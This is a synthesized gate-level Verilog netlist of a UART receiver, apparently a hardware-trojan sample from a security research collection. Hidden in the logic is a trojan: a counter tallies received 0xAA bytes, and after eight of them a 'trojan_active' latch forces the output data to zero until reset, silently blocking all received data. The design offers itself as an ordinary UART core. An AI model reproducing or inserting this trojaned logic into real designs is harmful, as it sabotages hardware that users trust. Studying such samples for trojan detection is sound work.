/* Generated by Yosys 0.9 (git sha1 1979e0b) */

module uart_rx(clk, resetn, uart_rxd, uart_rx_en, uart_rx_break, uart_rx_valid, uart_rx_data);
  wire [3:0] _000_;
  wire _001_;
  wire [13:0] _002_;
  wire [7:0] _003_;
  wire _004_;
  wire _005_;
  wire [7:0] _006_;
  wire _007_;
  wire [7:0] _008_;
  wire _009_;
  wire _010_;
  wire _011_;
  wire _012_;
  wire _013_;
  wire _014_;
  wire _015_;
  wire _016_;
  wire _017_;
  wire _018_;
  wire _019_;
  wire _020_;
  wire _021_;
  wire _022_;
  wire _023_;
  wire _024_;
  wire _025_;
  wire _026_;
  wire _027_;
  wire _028_;
  wire _029_;
  wire _030_;
  wire _031_;
  wire _032_;
  wire _033_;
  wire _034_;
  wire _035_;
  wire _036_;
  wire _037_;
  wire _038_;
  wire _039_;
  wire _040_;
  wire _041_;
  wire _042_;
  wire _043_;
  wire _044_;
  wire _045_;
  wire _046_;
  wire _047_;
  wire _048_;
  wire _049_;
  wire _050_;
  wire _051_;
  wire _052_;
  wire _053_;
  wire _054_;
  wire _055_;
  wire _056_;
  wire _057_;
  wire _058_;
  wire _059_;
  wire _060_;
  wire _061_;
  wire _062_;
  wire _063_;
  wire _064_;
  wire _065_;
  wire _066_;
  wire _067_;
  wire _068_;
  wire _069_;
  wire _070_;
  wire _071_;
  wire _072_;
  wire _073_;
  wire _074_;
  wire _075_;
  wire _076_;
  wire _077_;
  wire _078_;
  wire _079_;
  wire _080_;
  wire _081_;
  wire _082_;
  wire _083_;
  wire _084_;
  wire _085_;
  wire _086_;
  wire _087_;
  wire _088_;
  wire _089_;
  wire _090_;
  wire _091_;
  wire _092_;
  wire _093_;
  wire _094_;
  wire _095_;
  wire _096_;
  wire _097_;
  wire _098_;
  wire _099_;
  wire _100_;
  wire _101_;
  wire _102_;
  wire _103_;
  wire _104_;
  wire _105_;
  wire _106_;
  wire _107_;
  wire _108_;
  wire _109_;
  wire _110_;
  wire _111_;
  wire _112_;
  wire _113_;
  wire _114_;
  wire _115_;
  wire _116_;
  wire _117_;
  wire _118_;
  wire _119_;
  wire _120_;
  wire _121_;
  wire _122_;
  wire _123_;
  wire _124_;
  wire _125_;
  wire _126_;
  wire _127_;
  wire _128_;
  wire _129_;
  wire _130_;
  wire _131_;
  wire _132_;
  wire _133_;
  wire _134_;
  wire _135_;
  wire _136_;
  wire _137_;
  wire _138_;
  wire _139_;
  wire _140_;
  wire _141_;
  wire _142_;
  wire _143_;
  wire _144_;
  wire _145_;
  wire _146_;
  wire _147_;
  wire _148_;
  wire _149_;
  wire _150_;
  wire _151_;
  wire _152_;
  wire _153_;
  wire _154_;
  wire _155_;
  wire _156_;
  wire _157_;
  wire _158_;
  wire _159_;
  wire _160_;
  wire _161_;
  wire _162_;
  wire _163_;
  wire _164_;
  wire _165_;
  wire _166_;
  wire _167_;
  wire _168_;
  wire _169_;
  wire _170_;
  wire _171_;
  wire _172_;
  wire _173_;
  wire _174_;
  wire _175_;
  wire _176_;
  wire _177_;
  wire _178_;
  wire _179_;
  wire _180_;
  wire _181_;
  wire _182_;
  wire _183_;
  wire _184_;
  wire _185_;
  wire _186_;
  wire _187_;
  wire _188_;
  wire _189_;
  wire _190_;
  wire _191_;
  wire _192_;
  wire _193_;
  wire _194_;
  wire _195_;
  wire _196_;
  wire _197_;
  wire _198_;
  wire _199_;
  wire _200_;
  wire _201_;
  wire _202_;
  wire _203_;
  wire _204_;
  wire _205_;
  wire _206_;
  wire _207_;
  wire _208_;
  wire _209_;
  wire _210_;
  wire _211_;
  wire _212_;
  wire _213_;
  wire _214_;
  wire _215_;
  wire _216_;
  wire _217_;
  wire _218_;
  wire _219_;
  wire _220_;
  wire _221_;
  wire _222_;
  wire _223_;
  wire _224_;
  wire _225_;
  wire _226_;
  wire _227_;
  wire _228_;
  wire _229_;
  wire _230_;
  wire _231_;
  reg [3:0] bit_counter;
  reg bit_sample;
  input clk;
  reg [13:0] cycle_counter;
  reg [3:0] fsm_state;
  reg [7:0] received_data;
  input resetn;
  reg rxd_reg;
  reg rxd_reg_0;
  reg [7:0] trigger_counter = 8'h00;
  reg trojan_active = 1'h0;
  output uart_rx_break;
  output [7:0] uart_rx_data;
  reg [7:0] uart_rx_data;
  input uart_rx_en;
  output uart_rx_valid;
  input uart_rxd;
  assign _013_ = ~(rxd_reg & fsm_state[0]);
  assign _014_ = ~(resetn & _013_);
  assign _015_ = ~(cycle_counter[5] | cycle_counter[4]);
  assign _016_ = ~(cycle_counter[10] | cycle_counter[13]);
  assign _017_ = ~(cycle_counter[1] | cycle_counter[0]);
  assign _018_ = cycle_counter[7] & cycle_counter[8];
  assign _019_ = _015_ & _017_;
  assign _020_ = _016_ & _018_;
  assign _021_ = _019_ & _020_;
  assign _022_ = cycle_counter[2] & ~(cycle_counter[3]);
  assign _023_ = ~(cycle_counter[9] | cycle_counter[12]);
  assign _024_ = cycle_counter[6] & cycle_counter[11];
  assign _025_ = _023_ & _024_;
  assign _026_ = _022_ & _025_;
  assign _027_ = _021_ & _026_;
  assign _028_ = ~(fsm_state[3] & _027_);
  assign _029_ = cycle_counter[3] & ~(cycle_counter[2]);
  assign _030_ = cycle_counter[12] & ~(cycle_counter[11]);
  assign _031_ = cycle_counter[9] & ~(cycle_counter[6]);
  assign _032_ = _030_ & _031_;
  assign _033_ = _029_ & _032_;
  assign _034_ = ~(_021_ & _033_);
  assign _035_ = ~(_028_ & _034_);
  assign _036_ = fsm_state[3] & _035_;
  assign _037_ = _015_ & _031_;
  assign _038_ = _017_ & _029_;
  assign _039_ = _037_ & _038_;
  assign _040_ = _030_ & _039_;
  assign _041_ = ~(_020_ & _040_);
  assign _042_ = ~(_028_ & _041_);
  assign _009_ = _014_ | _036_;
  assign _043_ = resetn & ~(_042_);
  assign _044_ = ~(bit_counter[1] | bit_counter[0]);
  assign _045_ = bit_counter[3] & ~(bit_counter[2]);
  assign _046_ = _044_ & _045_;
  assign _047_ = fsm_state[1] & _046_;
  assign _048_ = fsm_state[3] & ~(_042_);
  assign _049_ = _047_ | _048_;
  assign _012_ = resetn & _049_;
  assign _050_ = fsm_state[0] & ~(rxd_reg);
  assign _051_ = fsm_state[2] & ~(_042_);
  assign _052_ = _050_ | _051_;
  assign _011_ = resetn & _052_;
  assign _053_ = _046_ | ~(fsm_state[1]);
  assign _054_ = ~(fsm_state[2] & _035_);
  assign _055_ = ~(_053_ & _054_);
  assign _010_ = resetn & _055_;
  assign _056_ = ~(fsm_state[1] | fsm_state[2]);
  assign _057_ = _056_ & ~(_050_);
  assign _058_ = ~(_036_ & _057_);
  assign uart_rx_valid = ~_058_;
  assign _059_ = ~(received_data[6] | received_data[4]);
  assign _060_ = ~(received_data[2] | received_data[0]);
  assign _061_ = _059_ & _060_;
  assign _062_ = ~(received_data[7] | received_data[5]);
  assign _063_ = ~(received_data[3] | received_data[1]);
  assign _064_ = _062_ & _063_;
  assign _065_ = _061_ & _064_;
  assign uart_rx_break = uart_rx_valid & _065_;
  assign _066_ = received_data[7] & received_data[5];
  assign _067_ = received_data[3] & received_data[1];
  assign _068_ = _066_ & _067_;
  assign _069_ = _061_ & _068_;
  assign _070_ = uart_rx_valid & _069_;
  assign _071_ = trigger_counter[0] | _070_;
  assign _072_ = ~(trigger_counter[0] & uart_rx_valid);
  assign _073_ = resetn & _072_;
  assign _006_[0] = _071_ & _073_;
  assign _074_ = ~(trigger_counter[1] & _058_);
  assign _075_ = trigger_counter[0] & trigger_counter[1];
  assign _076_ = trigger_counter[0] ^ trigger_counter[1];
  assign _077_ = ~(_070_ & _076_);
  assign _078_ = ~(_074_ & _077_);
  assign _006_[1] = resetn & _078_;
  assign _079_ = ~(trigger_counter[2] & _058_);
  assign _080_ = trigger_counter[2] & _075_;
  assign _081_ = trigger_counter[2] ^ _075_;
  assign _082_ = ~(_070_ & _081_);
  assign _083_ = ~(_079_ & _082_);
  assign _006_[2] = resetn & _083_;
  assign _084_ = ~(trigger_counter[3] & _058_);
  assign _085_ = trigger_counter[3] & _080_;
  assign _086_ = trigger_counter[3] ^ _080_;
  assign _087_ = ~(_070_ & _086_);
  assign _088_ = ~(_084_ & _087_);
  assign _006_[3] = resetn & _088_;
  assign _089_ = ~(trigger_counter[4] & _058_);
  assign _090_ = trigger_counter[4] & _085_;
  assign _091_ = _090_ | ~(_070_);
  assign _092_ = ~(_089_ & _091_);
  assign _093_ = trigger_counter[4] | _085_;
  assign _094_ = resetn & _093_;
  assign _006_[4] = _092_ & _094_;
  assign _095_ = ~(trigger_counter[5] & _058_);
  assign _096_ = trigger_counter[5] & _090_;
  assign _097_ = _096_ | ~(_070_);
  assign _098_ = ~(_095_ & _097_);
  assign _099_ = trigger_counter[5] | _090_;
  assign _100_ = resetn & _099_;
  assign _006_[5] = _098_ & _100_;
  assign _101_ = ~(trigger_counter[6] & _058_);
  assign _102_ = trigger_counter[6] & _096_;
  assign _103_ = _102_ | ~(_070_);
  assign _104_ = ~(_101_ & _103_);
  assign _105_ = trigger_counter[6] | _096_;
  assign _106_ = resetn & _105_;
  assign _006_[6] = _104_ & _106_;
  assign _107_ = _070_ & _102_;
  assign _108_ = trigger_counter[7] | _107_;
  assign _109_ = ~(trigger_counter[7] & _102_);
  assign _110_ = ~(_069_ & _109_);
  assign _111_ = ~(uart_rx_valid & _110_);
  assign _112_ = resetn & _111_;
  assign _006_[7] = _108_ & _112_;
  assign _113_ = rxd_reg_0 | uart_rx_en;
  assign _114_ = uart_rxd | ~(uart_rx_en);
  assign _115_ = ~(_113_ & _114_);
  assign _005_ = ~(resetn & _115_);
  assign _116_ = rxd_reg | uart_rx_en;
  assign _117_ = rxd_reg_0 | ~(uart_rx_en);
  assign _118_ = ~(_116_ & _117_);
  assign _004_ = ~(resetn & _118_);
  assign _119_ = ~(fsm_state[3] | fsm_state[2]);
  assign _120_ = fsm_state[1] | ~(_119_);
  assign _121_ = cycle_counter[0] & _120_;
  assign _122_ = cycle_counter[0] ^ _120_;
  assign _002_[0] = _043_ & _122_;
  assign _123_ = cycle_counter[1] & _121_;
  assign _124_ = cycle_counter[1] | _121_;
  assign _125_ = resetn & _124_;
  assign _002_[1] = _125_ & ~(_123_);
  assign _126_ = cycle_counter[2] & _123_;
  assign _127_ = cycle_counter[2] ^ _123_;
  assign _002_[2] = _043_ & _127_;
  assign _128_ = cycle_counter[3] | _126_;
  assign _129_ = cycle_counter[1] & cycle_counter[3];
  assign _130_ = cycle_counter[2] & _129_;
  assign _131_ = _121_ & _130_;
  assign _132_ = _128_ & ~(_131_);
  assign _002_[3] = _043_ & _132_;
  assign _133_ = cycle_counter[4] & _131_;
  assign _134_ = cycle_counter[4] | _131_;
  assign _135_ = resetn & _134_;
  assign _002_[4] = _135_ & ~(_133_);
  assign _136_ = cycle_counter[5] & _133_;
  assign _137_ = cycle_counter[5] | _133_;
  assign _138_ = resetn & _137_;
  assign _002_[5] = _138_ & ~(_136_);
  assign _139_ = cycle_counter[5] & cycle_counter[6];
  assign _140_ = _133_ & _139_;
  assign _141_ = cycle_counter[6] ^ _136_;
  assign _002_[6] = _043_ & _141_;
  assign _142_ = ~(cycle_counter[7] & _140_);
  assign _143_ = cycle_counter[7] | _140_;
  assign _144_ = _043_ & _143_;
  assign _002_[7] = _142_ & _144_;
  assign _145_ = cycle_counter[8] | ~(_142_);
  assign _146_ = _018_ & _139_;
  assign _147_ = _133_ & _146_;
  assign _148_ = _043_ & ~(_147_);
  assign _002_[8] = _145_ & _148_;
  assign _149_ = cycle_counter[9] & _147_;
  assign _150_ = cycle_counter[9] | _147_;
  assign _151_ = _043_ & _150_;
  assign _002_[9] = _151_ & ~(_149_);
  assign _152_ = cycle_counter[10] & _149_;
  assign _153_ = cycle_counter[10] | _149_;
  assign _154_ = resetn & _153_;
  assign _002_[10] = _154_ & ~(_152_);
  assign _155_ = cycle_counter[11] & _152_;
  assign _156_ = cycle_counter[11] | _152_;
  assign _157_ = _043_ & _156_;
  assign _002_[11] = _157_ & ~(_155_);
  assign _158_ = ~(cycle_counter[12] & _155_);
  assign _159_ = cycle_counter[12] | _155_;
  assign _160_ = _043_ & _159_;
  assign _002_[12] = _158_ & _160_;
  assign _161_ = ~(cycle_counter[13] ^ _158_);
  assign _002_[13] = resetn & _161_;
  assign _162_ = fsm_state[1] & _035_;
  assign _163_ = resetn & ~(fsm_state[0]);
  assign _164_ = _119_ & _163_;
  assign _165_ = fsm_state[1] & _042_;
  assign _166_ = bit_counter[0] & _165_;
  assign _167_ = ~(bit_counter[0] ^ _165_);
  assign _000_[0] = _164_ & ~(_167_);
  assign _168_ = bit_counter[1] | _166_;
  assign _169_ = _164_ & _168_;
  assign _170_ = bit_counter[1] & _166_;
  assign _000_[1] = _169_ & ~(_170_);
  assign _171_ = bit_counter[2] | _170_;
  assign _172_ = _164_ & _171_;
  assign _173_ = ~(bit_counter[2] & _170_);
  assign _000_[2] = _172_ & _173_;
  assign _174_ = ~(bit_counter[3] ^ _173_);
  assign _000_[3] = _164_ & _174_;
  assign _175_ = resetn & ~(trojan_active);
  assign _176_ = fsm_state[3] | ~(uart_rx_data[0]);
  assign _177_ = ~(fsm_state[3] & received_data[0]);
  assign _178_ = ~(_176_ & _177_);
  assign _008_[0] = _175_ & _178_;
  assign _179_ = ~(fsm_state[3] & received_data[1]);
  assign _180_ = fsm_state[3] | ~(uart_rx_data[1]);
  assign _181_ = ~(_179_ & _180_);
  assign _008_[1] = _175_ & _181_;
  assign _182_ = ~(fsm_state[3] & received_data[2]);
  assign _183_ = fsm_state[3] | ~(uart_rx_data[2]);
  assign _184_ = ~(_182_ & _183_);
  assign _008_[2] = _175_ & _184_;
  assign _185_ = fsm_state[3] | ~(uart_rx_data[3]);
  assign _186_ = ~(fsm_state[3] & received_data[3]);
  assign _187_ = ~(_185_ & _186_);
  assign _008_[3] = _175_ & _187_;
  assign _188_ = ~(fsm_state[3] & received_data[4]);
  assign _189_ = fsm_state[3] | ~(uart_rx_data[4]);
  assign _190_ = ~(_188_ & _189_);
  assign _008_[4] = _175_ & _190_;
  assign _191_ = ~(fsm_state[3] & received_data[5]);
  assign _192_ = fsm_state[3] | ~(uart_rx_data[5]);
  assign _193_ = ~(_191_ & _192_);
  assign _008_[5] = _175_ & _193_;
  assign _194_ = ~(fsm_state[3] & received_data[6]);
  assign _195_ = fsm_state[3] | ~(uart_rx_data[6]);
  assign _196_ = ~(_194_ & _195_);
  assign _008_[6] = _175_ & _196_;
  assign _197_ = ~(fsm_state[3] & received_data[7]);
  assign _198_ = fsm_state[3] | ~(uart_rx_data[7]);
  assign _199_ = ~(_197_ & _198_);
  assign _008_[7] = _175_ & _199_;
  assign _200_ = ~(trigger_counter[3] | trigger_counter[4]);
  assign _201_ = ~(trigger_counter[5] | trojan_active);
  assign _202_ = ~(trigger_counter[6] | trigger_counter[7]);
  assign _203_ = _200_ & _202_;
  assign _204_ = ~(_201_ & _203_);
  assign _007_ = resetn & _204_;
  assign _205_ = ~(rxd_reg & _027_);
  assign _206_ = _027_ | ~(bit_sample);
  assign _207_ = ~(_205_ & _206_);
  assign _001_ = resetn & _207_;
  assign _208_ = ~(received_data[2] & _162_);
  assign _209_ = _162_ | ~(received_data[1]);
  assign _210_ = ~(_208_ & _209_);
  assign _003_[1] = _163_ & _210_;
  assign _211_ = ~(received_data[1] & _162_);
  assign _212_ = _162_ | ~(received_data[0]);
  assign _213_ = ~(_211_ & _212_);
  assign _003_[0] = _163_ & _213_;
  assign _214_ = received_data[2] | _165_;
  assign _215_ = _163_ & _214_;
  assign _216_ = received_data[3] | ~(_165_);
  assign _003_[2] = _215_ & _216_;
  assign _217_ = ~(received_data[4] & _162_);
  assign _218_ = _162_ | ~(received_data[3]);
  assign _219_ = ~(_217_ & _218_);
  assign _003_[3] = _163_ & _219_;
  assign _220_ = received_data[4] | _165_;
  assign _221_ = _163_ & _220_;
  assign _222_ = received_data[5] | ~(_165_);
  assign _003_[4] = _221_ & _222_;
  assign _223_ = received_data[5] | _165_;
  assign _224_ = _163_ & _223_;
  assign _225_ = received_data[6] | ~(_165_);
  assign _003_[5] = _224_ & _225_;
  assign _226_ = received_data[6] | _165_;
  assign _227_ = _163_ & _226_;
  assign _228_ = received_data[7] | ~(_165_);
  assign _003_[6] = _227_ & _228_;
  assign _229_ = ~(bit_sample & _162_);
  assign _230_ = _162_ | ~(received_data[7]);
  assign _231_ = ~(_229_ & _230_);
  assign _003_[7] = _163_ & _231_;
  always @(posedge clk)
      fsm_state[0] <= _009_;
  always @(posedge clk)
      fsm_state[1] <= _010_;
  always @(posedge clk)
      fsm_state[2] <= _011_;
  always @(posedge clk)
      fsm_state[3] <= _012_;
  always @(posedge clk)
      trigger_counter[0] <= _006_[0];
  always @(posedge clk)
      trigger_counter[1] <= _006_[1];
  always @(posedge clk)
      trigger_counter[2] <= _006_[2];
  always @(posedge clk)
      trigger_counter[3] <= _006_[3];
  always @(posedge clk)
      trigger_counter[4] <= _006_[4];
  always @(posedge clk)
      trigger_counter[5] <= _006_[5];
  always @(posedge clk)
      trigger_counter[6] <= _006_[6];
  always @(posedge clk)
      trigger_counter[7] <= _006_[7];
  always @(posedge clk)
      trojan_active <= _007_;
  always @(posedge clk)
      rxd_reg <= _004_;
  always @(posedge clk)
      rxd_reg_0 <= _005_;
  always @(posedge clk)
      cycle_counter[0] <= _002_[0];
  always @(posedge clk)
      cycle_counter[1] <= _002_[1];
  always @(posedge clk)
      cycle_counter[2] <= _002_[2];
  always @(posedge clk)
      cycle_counter[3] <= _002_[3];
  always @(posedge clk)
      cycle_counter[4] <= _002_[4];
  always @(posedge clk)
      cycle_counter[5] <= _002_[5];
  always @(posedge clk)
      cycle_counter[6] <= _002_[6];
  always @(posedge clk)
      cycle_counter[7] <= _002_[7];
  always @(posedge clk)
      cycle_counter[8] <= _002_[8];
  always @(posedge clk)
      cycle_counter[9] <= _002_[9];
  always @(posedge clk)
      cycle_counter[10] <= _002_[10];
  always @(posedge clk)
      cycle_counter[11] <= _002_[11];
  always @(posedge clk)
      cycle_counter[12] <= _002_[12];
  always @(posedge clk)
      cycle_counter[13] <= _002_[13];
  always @(posedge clk)
      bit_sample <= _001_;
  always @(posedge clk)
      bit_counter[0] <= _000_[0];
  always @(posedge clk)
      bit_counter[1] <= _000_[1];
  always @(posedge clk)
      bit_counter[2] <= _000_[2];
  always @(posedge clk)
      bit_counter[3] <= _000_[3];
  always @(posedge clk)
      received_data[0] <= _003_[0];
  always @(posedge clk)
      received_data[1] <= _003_[1];
  always @(posedge clk)
      received_data[2] <= _003_[2];
  always @(posedge clk)
      received_data[3] <= _003_[3];
  always @(posedge clk)
      received_data[4] <= _003_[4];
  always @(posedge clk)
      received_data[5] <= _003_[5];
  always @(posedge clk)
      received_data[6] <= _003_[6];
  always @(posedge clk)
      received_data[7] <= _003_[7];
  always @(posedge clk)
      uart_rx_data[0] <= _008_[0];
  always @(posedge clk)
      uart_rx_data[1] <= _008_[1];
  always @(posedge clk)
      uart_rx_data[2] <= _008_[2];
  always @(posedge clk)
      uart_rx_data[3] <= _008_[3];
  always @(posedge clk)
      uart_rx_data[4] <= _008_[4];
  always @(posedge clk)
      uart_rx_data[5] <= _008_[5];
  always @(posedge clk)
      uart_rx_data[6] <= _008_[6];
  always @(posedge clk)
      uart_rx_data[7] <= _008_[7];
endmodule
